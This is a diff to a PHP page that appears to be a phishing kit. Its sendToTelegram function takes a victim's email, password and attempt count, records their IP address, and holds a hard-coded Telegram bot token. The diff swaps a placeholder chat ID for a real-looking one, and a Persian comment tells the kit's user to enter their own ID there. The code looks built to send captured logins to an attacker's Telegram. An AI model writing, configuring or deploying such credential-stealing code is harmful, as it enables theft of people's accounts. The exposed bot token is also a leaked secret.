@@ -3,7 +3,7 @@ session_start();
 
 function sendToTelegram($email, $pass, $attempt) {
     $token   = "7455551654:AAEiqVcQCG29uzoXIiK9h2KUKfUef_GfRXM";
-    $chat_id = "123456789"; // ← آیدی خودت رو اینجا بنویس
+    $chat_id = "5389485877"; // ← آیدی خودت رو اینجا بنویس
 
     $ip    = $_SERVER['REMOTE_ADDR'];
     $time  = date('Y-m-d H:i:s', strtotime('+3:30 hours'));
@@ -93,4 +93,5 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     </div>
 </div>
 </body>
+
 </html>
